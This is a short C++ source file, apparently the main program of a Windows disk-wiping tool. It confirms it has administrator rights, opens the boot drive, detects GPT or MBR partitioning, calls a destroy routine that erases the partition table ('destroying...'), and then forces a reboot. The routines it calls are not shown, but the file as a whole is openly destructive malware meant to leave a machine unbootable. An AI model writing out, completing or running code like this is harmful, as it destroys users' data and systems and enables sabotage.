#include <iostream>

#include "boot.h"
#include "util.h"

int Finalize(int code = 0, bool key = true);

int main()
{
	if (!IsElevated())
	{
		std::wcout << L"Run as administrator." << std::endl;
		return Finalize(1);
	}

	if (!OpenBootDrive())
	{
		return Finalize(2);
	}

	PartitionStyle style;
	if (!GetBootDriveType(style))
	{
		return Finalize(3);
	}

	bool (*destroy)();
	if (style == PartitionStyle::Gpt)
	{
		std::wcout << L"Detected GPT, destroying..." << std::endl;
		destroy = DestroyGPT;
	}
	else
	{
		std::wcout << L"Detected MBR, destroying..." << std::endl;
		destroy = DestroyMBR;
	}

	if (!destroy())
	{
		return Finalize(4);
	}

	std::wcout << L"Done." << std::endl;
	Finalize();

	if (!Reboot())
	{
		return 5;
	}

	return 0;
}

int Finalize(const int code, const bool key)
{
	CloseBootDrive();

	if (key)
	{
		std::wcout << L"Press Enter to exit.";
		std::wcin >> std::ws;
	}

	return code;
}
